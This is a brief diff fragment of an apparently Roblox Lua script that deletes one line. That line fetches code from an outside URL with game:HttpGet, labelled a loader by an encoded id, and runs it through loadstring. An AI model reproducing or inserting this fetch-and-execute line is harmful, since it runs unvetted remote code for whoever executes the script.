@@ -5722,4 +5722,3 @@ if not ok then
 	warn("Failed", result)
 end
 
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU0MDkyNTgwLTkxOGEtNGUzNS05OTI0LTJlYzA0MTg0ZjE0YiIsImtpbmQiOiJsb2FkZXIifQ"))()
